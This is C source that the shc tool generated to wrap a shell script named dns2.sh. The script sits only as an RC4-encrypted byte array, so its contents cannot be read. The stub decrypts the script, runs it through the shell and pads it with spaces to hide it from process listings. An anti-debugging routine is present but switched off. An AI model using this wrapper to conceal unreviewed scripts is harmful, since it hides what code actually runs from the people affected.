#if 0

	shc -r -v -f /root/dns2.sh 
#endif

static  char data [] = 
#define      lsto_z	1
#define      lsto	((&data[0]))
	"\352"
#define      chk2_z	19
#define      chk2	((&data[1]))
	"\270\361\274\216\060\347\004\267\167\110\121\011\277\252\206\107"
	"\157\260\143\341"
#define      shll_z	10
#define      shll	((&data[21]))
	"\115\240\146\106\020\077\234\151\217\033\253\157"
#define      opts_z	1
#define      opts	((&data[33]))
	"\177"
#define      pswd_z	256
#define      pswd	((&data[45]))
	"\141\004\346\016\342\366\212\302\301\147\046\201\261\211\332\323"
	"\213\204\262\146\071\371\143\154\134\017\305\251\163\052\073\045"
	"\003\232\121\216\127\217\275\171\110\161\372\371\372\325\315\206"
	"\131\177\354\222\170\120\377\325\140\304\176\323\357\271\371\362"
	"\123\112\200\253\331\076\044\042\257\036\034\252\363\351\060\115"
	"\151\035\337\342\155\337\267\315\243\066\241\223\357\232\205\103"
	"\344\005\356\276\103\022\341\363\061\376\235\045\350\316\162\122"
	"\353\122\064\131\061\354\047\325\043\310\150\022\142\356\126\107"
	"\363\105\005\067\130\347\053\212\346\310\257\316\226\042\041\202"
	"\164\126\333\246\102\002\174\145\313\344\170\055\322\317\164\306"
	"\024\172\376\155\142\051\367\110\362\246\027\211\311\070\013\075"
	"\216\347\343\320\351\137\066\265\104\257\342\027\176\126\336\223"
	"\321\335\000\063\006\370\173\371\236\223\202\150\313\215\245\131"
	"\164\211\052\136\351\140\023\056\020\366\106\216\115\044\042\036"
	"\001\043\122\010\033\316\001\272\141\203\042\054\021\307\205\206"
	"\121\257\345\073\020\371\151\040\357\257\257\074\324\321\133\325"
	"\365\255\336\020\173\337\312\334\143\355\011\256\160\234\143\377"
	"\230\152\076\171\254\215\123\127\374\035\262\034\043\341\015\204"
	"\346\363\223\311\352\035\213\254\204\262\133\365\116\276\365\347"
	"\051\063\140\325\300\264\055\275\321\340\331\364\301\346\171\250"
	"\332\014\161\304\052\375\161\256"
#define      rlax_z	1
#define      rlax	((&data[362]))
	"\044"
#define      msg1_z	65
#define      msg1	((&data[372]))
	"\345\264\314\106\212\214\373\270\112\240\263\045\213\335\111\232"
	"\353\004\160\054\166\264\124\057\107\102\224\220\127\020\364\004"
	"\075\121\273\371\327\020\076\122\151\367\301\123\340\146\172\037"
	"\373\274\013\023\255\166\161\353\255\005\314\006\327\164\320\036"
	"\100\266\300\322\147\251\200\020\266\320\314\230\043\301\132\012"
	"\073\002\344\107"
#define      tst1_z	22
#define      tst1	((&data[450]))
	"\161\032\040\152\221\140\204\204\174\273\354\361\352\165\020\050"
	"\226\227\321\325\226\354\210\344\243\040\346"
#define      text_z	2536
#define      text	((&data[551]))
	"\136\005\046\052\113\261\267\106\151\002\023\001\045\325\134\060"
	"\021\137\025\130\322\276\312\104\331\353\144\300\260\203\062\016"
	"\211\131\071\324\012\361\033\163\364\057\165\032\005\321\112\026"
	"\060\137\157\003\036\071\107\367\045\254\270\325\060\353\344\271"
	"\104\035\216\116\017\252\302\003\331\070\035\336\012\264\340\136"
	"\173\110\076\004\164\316\125\357\242\145\357\000\205\116\145\366"
	"\217\325\127\154\213\356\317\024\166\240\263\230\156\053\150\266"
	"\150\226\026\227\314\034\220\234\175\012\046\140\235\125\334\232"
	"\102\103\274\060\157\141\357\342\325\227\302\052\271\174\166\104"
	"\051\054\327\154\226\042\267\360\074\205\231\360\115\015\253\376"
	"\126\227\004\016\256\265\207\242\001\373\360\312\042\372\260\307"
	"\054\331\213\171\103\211\026\052\374\332\027\266\267\365\171\113"
	"\034\304\370\171\214\103\327\066\311\311\202\117\221\021\030\245"
	"\313\221\201\316\302\262\124\211\345\375\040\005\215\361\066\342"
	"\140\243\032\321\042\153\355\112\055\312\360\247\013\115\323\343"
	"\305\146\362\345\253\053\102\343\310\161\275\103\036\113\347\370"
	"\342\345\163\146\164\233\035\026\310\371\020\305\270\370\342\277"
	"\324\063\237\342\062\172\050\337\357\002\054\367\174\071\101\020"
	"\271\204\135\020\162\075\005\341\300\174\341\000\024\316\247\333"
	"\340\010\357\316\111\053\220\072\315\055\060\324\034\137\251\104"
	"\034\215\242\262\305\356\113\004\173\164\177\333\154\216\242\342"
	"\230\324\054\263\363\241\044\101\263\264\336\252\330\254\256\365"
	"\264\105\073\220\230\372\017\241\245\073\066\044\237\055\032\065"
	"\126\215\010\346\356\311\026\274\341\124\051\164\254\176\266\074"
	"\274\313\327\312\244\137\375\336\264\262\160\236\061\227\263\312"
	"\350\264\256\273\166\330\352\003\046\021\225\251\334\116\357\200"
	"\266\235\067\102\153\324\004\253\020\212\061\261\360\174\042\152"
	"\143\320\001\023\260\063\262\043\203\252\362\157\361\126\176\324"
	"\065\303\224\207\057\327\102\260\114\053\312\174\074\065\261\121"
	"\366\332\300\000\135\247\200\017\304\004\073\254\057\077\013\371"
	"\241\140\141\342\044\073\132\104\106\343\012\336\270\051\003\037"
	"\162\001\325\105\025\375\052\002\056\175\161\265\201\230\322\140"
	"\104\022\007\055\132\053\174\311\114\223\107\324\374\025\037\257"
	"\270\114\172\241\247\362\024\224\314\105\244\310\073\036\020\131"
	"\354\133\100\246\141\104\154\355\356\352\331\377\134\366\253\246"
	"\165\334\031\306\050\062\052\342\103\071\256\303\067\104\220\012"
	"\176\032\037\224\140\122\114\243\131\336\346\220\244\137\104\056"
	"\037\223\023\064\263\276\013\010\003\211\030\224\125\137\151\167"
	"\276\153\236\316\254\072\366\055\243\270\307\321\023\257\054\123"
	"\040\225\136\117\154\174\127\012\313\212\230\122\054\225\334\305"
	"\347\136\270\177\222\015\320\240\047\137\075\121\124\265\012\251"
	"\072\114\117\203\040\114\230\231\366\340\212\014\202\122\371\360"
	"\362\273\207\144\032\321\264\306\366\136\253\102\355\166\020\111"
	"\232\266\235\214\165\137\064\216\254\170\061\277\112\362\107\276"
	"\236\030\062\244\134\226\005\255\137\241\125\146\047\300\164\233"
	"\170\164\242\165\146\147\156\263\324\212\330\173\273\071\317\260"
	"\144\377\275\070\041\057\074\343\152\117\051\220\026\103\247\212"
	"\042\212\351\260\260\116\334\220\333\146\121\067\310\330\012\104"
	"\137\172\155\172\030\077\251\210\204\141\040\066\126\345\063\277"
	"\141\046\262\275\011\302\154\005\224\375\040\272\311\217\145\101"
	"\102\140\031\100\260\140\065\326\302\002\101\307\262\325\353\012"
	"\373\003\273\000\240\161\221\122\045\023\305\017\213\305\377\101"
	"\177\007\056\231\057\334\120\255\365\322\321\213\122\052\172\326"
	"\324\341\077\164\217\342\224\045\303\222\245\371\150\265\277\043"
	"\100\216\260\353\201\251\202\203\346\040\243\370\064\274\344\314"
	"\042\240\311\074\156\056\152\146\232\051\160\055\076\040\210\063"
	"\050\015\137\115\216\313\235\113\054\223\142\040\233\321\226\056"
	"\105\034\062\004\214\371\016\240\224\270\213\067\121\266\036\145"
	"\075\272\333\055\312\050\045\330\316\037\120\212\100\050\212\255"
	"\250\251\260\161\215\176\022\060\174\313\357\317\345\072\037\110"
	"\254\256\010\013\372\020\032\124\330\317\160\134\163\041\367\016"
	"\232\241\046\044\223\052\302\300\313\153\243\157\226\364\071\060"
	"\260\023\151\000\134\346\203\055\353\153\267\062\113\105\326\047"
	"\223\172\246\313\127\357\372\134\174\157\314\314\323\257\253\240"
	"\243\372\334\230\052\036\241\062\131\353\254\261\176\137\133\025"
	"\073\373\214\160\311\067\142\332\116\216\161\355\105\046\210\356"
	"\104\325\225\270\042\254\063\104\002\334\235\041\303\044\022\063"
	"\207\107\350\000\012\342\163\351\273\263\002\146\067\234\161\117"
	"\145\254\033\030\131\343\027\346\202\106\051\120\305\037\321\230"
	"\046\271\026\120\175\023\341\312\133\063\317\051\077\272\262\330"
	"\052\372\317\144\246\021\133\125\172\227\136\346\007\127\342\145"
	"\343\275\371\132\321\015\210\376\071\175\145\336\350\112\005\217"
	"\042\315\245\174\264\032\243\074\221\053\243\145\015\113\263\055"
	"\162\375\261\006\264\147\123\272\202\166\167\322\354\356\376\075"
	"\107\360\157\060\154\362\026\062\012\227\123\216\126\007\344\221"
	"\132\246\113\046\032\047\343\152\351\216\024\262\062\066\334\362"
	"\067\206\307\232\376\307\252\301\225\067\167\211\034\360\013\340"
	"\115\100\155\345\051\376\112\313\114\372\072\044\112\037\310\230"
	"\306\031\011\265\063\166\151\250\001\354\345\172\210\260\055\203"
	"\057\147\357\200\040\255\257\043\174\133\335\264\023\320\060\204"
	"\373\055\155\025\333\022\003\177\322\030\235\337\120\051\125\152"
	"\045\300\234\106\241\167\343\357\366\273\326\013\261\125\344\015"
	"\122\354\351\160\321\232\144\243\061\223\052\305\156\045\213\007"
	"\043\133\221\264\200\016\137\223\143\304\352\063\164\243\270\110"
	"\022\136\132\366\044\326\332\151\244\023\054\064\362\224\021\034"
	"\014\132\061\105\337\076\074\035\074\312\066\210\237\012\247\237"
	"\275\177\240\046\025\032\141\036\341\222\023\113\266\160\131\077"
	"\110\331\373\000\127\075\376\234\164\202\243\114\031\257\273\077"
	"\316\103\126\275\001\372\057\027\147\071\163\321\353\177\214\250"
	"\213\020\036\242\062\162\373\325\373\300\041\206\345\050\002\255"
	"\216\107\071\270\370\142\054\151\037\217\360\056\141\203\201\362"
	"\367\135\233\253\044\220\215\353\174\302\266\305\046\261\267\214"
	"\216\201\155\177\315\107\377\206\370\055\166\367\372\026\110\263"
	"\114\132\350\250\151\154\076\334\367\122\006\173\306\230\157\152"
	"\120\263\000\244\273\362\230\225\144\010\155\127\347\102\374\324"
	"\263\350\241\037\036\100\055\154\055\340\221\065\304\323\101\372"
	"\367\246\245\360\201\050\170\376\123\116\074\120\005\050\340\225"
	"\177\260\332\366\151\042\253\045\177\237\212\357\234\133\264\021"
	"\012\165\371\003\052\262\001\371\357\140\045\077\141\067\316\370"
	"\332\271\312\073\125\100\333\130\341\015\230\005\172\150\334\363"
	"\003\047\130\323\301\313\054\123\044\103\224\332\177\260\316\221"
	"\144\123\043\054\152\211\042\313\060\245\040\075\250\336\025\135"
	"\114\366\016\305\257\176\110\364\167\362\067\143\104\077\213\343"
	"\341\360\126\305\224\160\354\217\276\136\275\052\042\230\240\162"
	"\210\017\175\166\242\202\212\016\141\104\044\125\234\276\212\202"
	"\021\356\252\276\155\215\302\142\034\341\206\100\274\174\367\345"
	"\246\317\025\320\146\051\057\005\335\014\037\371\043\127\332\264"
	"\047\231\116\150\100\244\243\045\003\202\015\110\340\356\216\056"
	"\157\036\366\342\224\042\214\117\034\051\141\335\011\334\173\053"
	"\010\021\216\006\146\106\211\031\241\241\065\166\260\332\371\311"
	"\176\346\236\316\204\340\144\233\333\217\137\314\116\120\341\057"
	"\214\027\220\337\035\112\155\165\207\377\332\221\352\205\162\110"
	"\233\254\250\047\230\336\117\300\141\324\136\340\053\067\340\044"
	"\065\353\327\317\044\072\367\136\310\237\177\332\030\307\303\206"
	"\056\147\270\252\245\163\004\033\241\232\047\116\243\147\276\021"
	"\022\055\004\162\343\040\273\053\035\147\334\315\202\242\172\027"
	"\147\054\137\172\362\014\203\263\304\316\074\336\006\136\033\366"
	"\063\150\034\017\355\073\223\327\005\225\313\132\012\127\370\305"
	"\207\361\327\300\074\015\231\156\354\040\121\203\243\144\145\373"
	"\342\006\134\023\223\325\046\155\263\216\244\227\250\213\242\270"
	"\311\102\372\035\125\315\031\362\341\341\300\366\157\015\216\221"
	"\060\144\306\253\346\343\274\371\067\354\255\157\204\154\370\140"
	"\077\045\126\357\211\030\200\233\132\125\250\070\333\321\044\107"
	"\126\011\202\310\214\030\255\130\325\310\065\314\200\257\024\151"
	"\113\052\365\117\050\301\261\031\112\232\312\120\110\247\211\171"
	"\007\207\021\363\171\026\117\310\306\251\260\060\254\327\222\210"
	"\220\017\262\252\331\021\001\131\173\151\177\101\172\042\112\026"
	"\157\165\117\001\327\220\157\342\030\100\301\307\155\170\113\323"
	"\375\315\025\237\103\011\361\027\123\226\346\321\350\352\370\330"
	"\273\045\350\003\114\344\073\247\310\027\175\330\136\175\054\036"
	"\066\152\300\261\135\305\347\303\131\241\331\071\321\140\133\006"
	"\331\150\343\003\344\247\123\214\373\064\167\022\221\044\134\275"
	"\306\362\256\163\171\144\146\243\135\043\212\072\363\200\122\000"
	"\145\127\242\155\136\226\132\020\022\244\011\147\163\175\125\256"
	"\335\302\065\305\040\247\153\116\334\277\170\053\135\176\107\005"
	"\257\067\137\026\056\045\310\115\115\131\162\053\125\022\032\270"
	"\127\334\102\164\302\137\366\054\003\071\373\247\352\216\322\021"
	"\061\327\266\117\254\211\164\056\235\110\072\141\134\310\206\053"
	"\143\156\115\014\104\167\075\145\377\034\057\035\221\051\221\160"
	"\056\210\131\141\114\352\246\017\074\370\040\063\123\137\254\332"
	"\375\067\274\022\127\317\107\241\212\343\330\277\160\375\277\342"
	"\102\251\060\105\113\264\274\251\074\341\233\073\244\350\251\325"
	"\266\210\221\056\115\252\161\254\037\304\034\344\314\101\230\000"
	"\135\345\024\370\156\245\133\213\163\152\346\227\323\050\033\022"
	"\121\144\111\117\364\047\166\111\374\171\077\015\377\370\053\311"
	"\142\361\303\166\063\316\373\320\210\334\342\323\173\021\234\160"
	"\263\106\301\126\121\005\125\134\061\152\366\214\267\047\167\325"
	"\266\000\017\175\223\341\316\142\116\016\123\340\277\153\241\065"
	"\007\163\032\205\353\145\246\310\253\051\232\004\375\047\167\274"
	"\055\037\037\115\064\326\002\343\015\265\112\310\313\367\352\213"
	"\225\220\300\237\111\127\011\175\330\166\341\372\321\241\357\032"
	"\051\237\255\052\361\016\326\135\156\273\033\255\246\172\372\053"
	"\264\307\001\302\275\061\324\272\032\046\347\124\027\136\361\253"
	"\255\330\055\366\122\013\054\220\041\065\001\203\134\335\062\206"
	"\126\173\272\243\123\342\337\011\070\066\245\215\006\052\376\047"
	"\336\324\055\350\375\354\236\311\036\100\311\071\375\027\012\203"
	"\121\251\222\336\250\062\263\377\163\321\246\202\026\113\025\352"
	"\071\077\306\052\120\216\345\174\315\231\036\232\302\243\145\366"
	"\306\007\023\274\151\111\147\023\270\155\226\066\203\355\037\101"
	"\003\006\066\011\307\167\061\144\331\013\060\207\000\056\351\162"
	"\001\034\305\171\041\241\241\012\260\052\061\055\201\060\364\101"
	"\352\120\152\071\327\341\143\203\243\224\167\047\226\022\303\351"
	"\055\240\366\023\103\333\021\117\217\074\351\044\044\333\007\137"
	"\066\245\126\055\175\150\365\072\307\144\076\345\236\206\335\303"
	"\063\226\230\143\201\174\035\305\232\253\024\252\125\327\255\057"
	"\017\313\016\031\063\003\124\373\150\223\341\006\031\276\311\115"
	"\125\142\260\326\336\316\234\171\172\261\043\320\211\321\377\230"
	"\235\016\262\320\022\007\313\172\232\255\200\264\153\112\001\301"
	"\254\262\227\213\200\064\004\372\345\050\312\157\372\311\007\227"
	"\330\272\150\352\301\064\144\133\341\345\017\115\057\021\016\333"
	"\303\246\146\103\332\152\075\300\223\010\057\215\322\067\045\252"
	"\361\215\224\262\302\371\016\243\336\036\360\015\057\376\350\362"
	"\245\116\066\177\271\163\077\115\173\157\332\116\246\000\370\230"
	"\215\214\112\117\206\131\363\144\167\343\161\246\342\131\231\207"
	"\250\317\007\142\103\107\257\277\266\212\015\135\212\005\365\030"
	"\222\100\150\030\231\133\175\020\077\356\267\042\110\120\252\361"
	"\040\261\123\143\370\003\043\257\215\060\014\027\066\002\060\311"
	"\102\230\341\333\363\137\354\063\115\243\125\226\364\377\207\025"
	"\261\333\171\252\336\234\131\153\315\146\203\003\150\263\314\252"
	"\113\256\205\077\015\162\162\133\025\310\361\012\307\171\037\170"
	"\124\230\042\063\064\174\236\001\342\042\005\113\326\321\365"
#define      date_z	1
#define      date	((&data[3369]))
	"\270"
#define      xecc_z	15
#define      xecc	((&data[3372]))
	"\324\350\243\303\243\036\071\366\110\277\060\141\305\202\331\145"
	"\050\003\234\332"
#define      inlo_z	3
#define      inlo	((&data[3390]))
	"\076\136\223"
#define      chk1_z	22
#define      chk1	((&data[3398]))
	"\305\000\333\372\174\043\045\225\141\313\314\052\360\352\236\202"
	"\110\336\043\207\333\032\260\251\067\206\132\172\374\137"
#define      msg2_z	19
#define      msg2	((&data[3423]))
	"\057\141\036\105\064\120\364\071\314\013\147\130\113\104\126\340"
	"\261\153\030\162\322\240"
#define      tst2_z	19
#define      tst2	((&data[3446]))
	"\366\062\362\326\310\256\340\114\270\006\056\355\117\061\315\272"
	"\022\354\354\263"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
